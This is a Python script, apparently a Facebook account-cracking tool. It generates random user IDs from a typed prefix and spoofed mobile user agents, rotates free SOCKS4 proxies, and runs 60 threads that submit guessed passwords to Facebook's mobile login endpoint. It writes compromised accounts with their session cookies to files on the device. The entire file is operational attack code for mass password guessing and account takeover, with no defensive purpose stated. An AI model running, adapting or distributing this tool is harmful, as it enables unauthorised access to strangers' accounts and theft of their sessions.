#si6xd
import os
import sys
import re
import bs4
import time
import random
import base64
import string
import requests
from concurrent.futures import ThreadPoolExecutor
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m'
O = '\x1b[1;98m'
B = '\033[1;34m'
W = '\033[1;97m'
ugnn = []
redmi=[]
for x in range(1000):
 rr = random.randint
 rc = random.choice
 A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
 B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
 C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 se = f'{A}{B}{C}{D}'
 if se in redmi:pass
 else:redmi.append(se)
try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()

pc = random.choice(['Windows NT 6.1; WOW64','X11; CrOS x86_64 8172.45.0','Windows NT 10.0; Win64; x64','X11; Linux x86_64'])
for Xr in range (9999):    
    a=f"Mozilla/5.0 ("+pc+""
    b=random.randrange(6, 12)
    c=random.randrange(3, 13)
    d='Build/'
    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g=random.randrange(80,100)
    h='0'
    i=random.randrange(4200,4900)
    j=random.randrange(40,150)
    k='Safari/537.36'
    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
    m=random.randrange(1,9)
    n=random.randrange(1,9)
    o='0'
    p=random.randrange(5,20)
    uaku=(f'{a}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
    ugnn.append(uaku)
ugn = []
realme = random.choice(["D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w","SM-A515F","SM-A235F","SM-A525F","SM-A715F","SM-G996B","SM-A705F","SM-A315F","V2183A","I2223","V2307","V2314","I2217","V2239"])

for Xr in range (5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.randrange(6, 13)
    c=random.randrange(3, 13)
    d='Build/'
    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    g=random.randrange(80,100)
    h='0'
    i=random.randrange(4200,4900)
    j=random.randrange(40,150)
    k='Mobile Safari/537.36'
    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
    m=random.randrange(1,9)
    n=random.randrange(1,9)
    o='0'
    p=random.randrange(5,20)
    uaku=(f'{a} {b}; {realme} {d}{e}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
    ugn.append(uaku)
def generate_user_agent():
    rr = random.randint
    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
    rx = random.randrange(1, 999)
    return (f"Mozilla/5.0 (Windows NT {rr(9,11)}; Win64; x64){aZ}{rx}{aZ}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko){rr(99,149)}.0.{rr(4500,4999)}.{rr(35,99)} "
            f"Chrome/{rr(99,175)}.0.{rr(0,5)}.{rr(0,5)} Safari/537.36")
            
loop = 0
oks = []
gen = []
logo = ("""
	\033[1;97m
  .d88b  .d8b.  d8888b. db    db d888888b .d8888. 
   `8P' d8' `8b 88  `8D 88    88   `88'   88'  YP \033
    ~88  88ooo88 88oobY' Y8    8P    88    `8bo.~  
    88  88~~~88 88`8b   `8b  d8'    88      `Y8b. 
db. 88  88   88 88 `88.  `8bd8'    .88.   db   8D 
Y8888P  YP   YP 88   YD    YP    Y888888P `8888Y'
              \x1b[1;91m—————— \x1b[1;97m[<MAIN4K>] \x1b[1;91m——————
\033[1;97m———————————————————————————————————————————————""")

def main():
    os.system('clear')
    print(logo)
    code = input(f'{Y}[{W}?{Y}] {W}input code : ')
    limit = input(f'{Y}[{W}?{Y}] {W}total id : ')
    for a in range(int(limit)):
        awm = "".join(random.choice(string.digits) for _ in range(6))
        gen.append(awm)
    with ThreadPoolExecutor(max_workers=60) as Submits:
        print(47*"\x1b[1;97m—") 
        for next in gen:
            ids = code + next
            mk = ids[:6]
            xx = ids[:7]
            v = ids[:8]
            b = next[:6]  
            passlist = [mk,xx,b,'57273200',v]
            Submits.submit(cracker,ids,passlist)

def values(url=None):
    code = {}
    session = requests.Session()
    try:
        response = session.get(url).text
        jazoest = re.search(r'name="jazoest" value="(.*?)"', response)
        m_ts = re.search(r'name="m_ts" value="(.*?)"', response)
        lsd = re.search(r'name="lsd" value="(.*?)"', response)
        li = re.search(r'name="li" value="(.*?)"', response)
        __dyn = re.search(r'name="__dyn" value="(.*?)"', response)
        __csr = re.search(r'name="__csr" value="(.*?)"', response)
        __a = re.search(r'name="__a" value="(.*?)"', response)
        bi_wvdp = re.search(r'name="bi_wvdp" value="(.*?)"', response)
        bi_xrwh = re.search(r'name="bi_xrwh" value="(.*?)"', response)
        
        code['li'] = li.group(1) if li else random.choice(['GosCZzoF-x4TPnttnppf6vQM' 'G4sCZ-e-gi91jL0vyyhgRvVO', 'HIsCZwuKjhSwv0KKTgpDapfT', 'HosCZ7N677bvIn23tMfXsv06'])
        code['lsd'] = lsd.group(1) if lsd else random.choice(['AVoXhSMaYhc', 'AVqPPp5vKyU', 'AVoE8plKK3k'])
        code['m_ts'] = m_ts.group(1) if m_ts else str(int(time.time()))
        code['jazoest'] = jazoest.group(1) if jazoest else str(random.randint(1000, 9000))
    
    except Exception as e:
        pass
    
    return code

def cracker(ids,passlist):
    global loop,oks,cps
    session = requests.Session()
    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for pas in passlist:
            nip=random.choice(proxsi)
            proxs= {'http': 'socks4://'+nip}
            moz = random.choice(ugn)
            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
            bv = f"{random.randint(1111111,7777777)}"
            versi_android = f"{random.randint(4,13)}"
            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Xiaomi Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Xiaomi Redmi Note 9 Pro"])
            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/en_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
            url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=112328095453510&kid_directed_site=0&app_id=112328095453510&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D112328095453510%26redirect_uri%3Dhttps%253A%252F%252Fservices.fandom.com%252Fkratos-public%252Fself-service%252Fmethods%252Foidc%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bopenid%26state%3DNzI2M2FiNWQtMjVlYy00MzljLWFjMDktMmNlMjQxYjU4ZGU1OjWIGYaY0kgOvRupnMmVYbU%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dba604444-a67b-46a5-bbe8-2f649f84f9cc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fservices.fandom.com%2Fkratos-public%2Fself-service%2Fmethods%2Foidc%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DNzI2M2FiNWQtMjVlYy00MzljLWFjMDktMmNlMjQxYjU4ZGU1OjWIGYaY0kgOvRupnMmVYbU%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr"
            headers1 = {'Host': 'm.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'cookie': 'datr=LuUsZ-nSZke_8vfLtEyLOmJt; sb=LuUsZ5GZrxOjqVrn_HevRdGg; m_pixel_ratio=1.015625; ps_l=1; ps_n=1; dpr=1.015625; wd=709x1261; fr=0Gcj2oo9mn1Bd1utV..BnLOUu..AAA.0.0.BnMHbU.AWVfW6qMQnQ', 'dpr': '1.015625', 'priority': 'u=0, i', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Chromium";v="125", "Not.A/Brand";v="24"', 'sec-ch-ua-full-version-list': '"Chromium";v="125.0.6422.141", "Not.A/Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"5.15.123"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': us, 'viewport-width': '625',}            
            requu1 = session.get(url1,headers=headers1)
            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(requu1.text)).group(1), 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
            loog_data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(requu1.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(requu1.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(requu1.text)).group(1), 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'next': '', 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '1', '__a': '',  '__user': '0'}
            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100" #https://mbasic.facebook.com/login/device-based/login/async/?api_key=112328095453510&auth_token=15e54b7cc758690f1b5e9cfd2aa7cd7a&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D112328095453510%26redirect_uri%3Dhttps%253A%252F%252Fservices.fandom.com%252Fkratos-public%252Fself-service%252Fmethods%252Foidc%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bopenid%26state%3DNzI2M2FiNWQtMjVlYy00MzljLWFjMDktMmNlMjQxYjU4ZGU1OjWIGYaY0kgOvRupnMmVYbU%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dba604444-a67b-46a5-bbe8-2f649f84f9cc%26tp%3Dunspecified&refsrc=deprecated&app_id=112328095453510&cancel=https%3A%2F%2Fservices.fandom.com%2Fkratos-public%2Fself-service%2Fmethods%2Foidc%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DNzI2M2FiNWQtMjVlYy00MzljLWFjMDktMmNlMjQxYjU4ZGU1OjWIGYaY0kgOvRupnMmVYbU%23_%3D_&lwv=100"
            headers = {'Host': 'm.facebook.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded', 'cookie': 'datr=LuUsZ-nSZke_8vfLtEyLOmJt; sb=LuUsZ5GZrxOjqVrn_HevRdGg; m_pixel_ratio=1.015625; ps_l=1; ps_n=1; dpr=1.015625; wd=709x1261; fr=0Gcj2oo9mn1Bd1utV..BnLOUu..AAA.0.0.BnMHbd.AWWPbA4lwj8', 'origin': 'https://m.facebook.com', 'priority': 'u=1, i', 'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=112328095453510&kid_directed_site=0&app_id=112328095453510&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D112328095453510%26redirect_uri%3Dhttps%253A%252F%252Fservices.fandom.com%252Fkratos-public%252Fself-service%252Fmethods%252Foidc%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%2Bopenid%26state%3DNzI2M2FiNWQtMjVlYy00MzljLWFjMDktMmNlMjQxYjU4ZGU1OjWIGYaY0kgOvRupnMmVYbU%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dba604444-a67b-46a5-bbe8-2f649f84f9cc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fservices.fandom.com%2Fkratos-public%2Fself-service%2Fmethods%2Foidc%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DNzI2M2FiNWQtMjVlYy00MzljLWFjMDktMmNlMjQxYjU4ZGU1OjWIGYaY0kgOvRupnMmVYbU%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Chromium";v="125", "Not.A/Brand";v="24"', 'sec-ch-ua-full-version-list': '"Chromium";v="125.0.6422.141", "Not.A/Brand";v="24.0.0.0"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"5.15.123"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': us, 'x-asbd-id': '129477', 'x-fb-lsd': 'AVqb4X-GJf4', 'x-requested-with': 'XMLHttpRequest', 'x-response-format': 'JSONStream',}            
            response = session.post(url,data=log_data,headers=headers,allow_redirects=False,proxies=proxs)
            #print(log_data)
            m = response.cookies.get_dict().keys()
            if "c_user" in m:
                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                user = re.findall('c_user=(.*);fr', coki)[0]
                print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+' | '+coki+'\n')
                open("/sdcard/ok.txt","a").write(user+"|"+pas+"|"+coki+"\n")
                oks.append(ids)
                break
            elif "checkpoint" in m:
                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
                open('/sdcard/CP.txt', 'a').write( ids+' | '+pas+' | '+coki+' \n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        #print(f"\nError: {e}")
        pass

main()
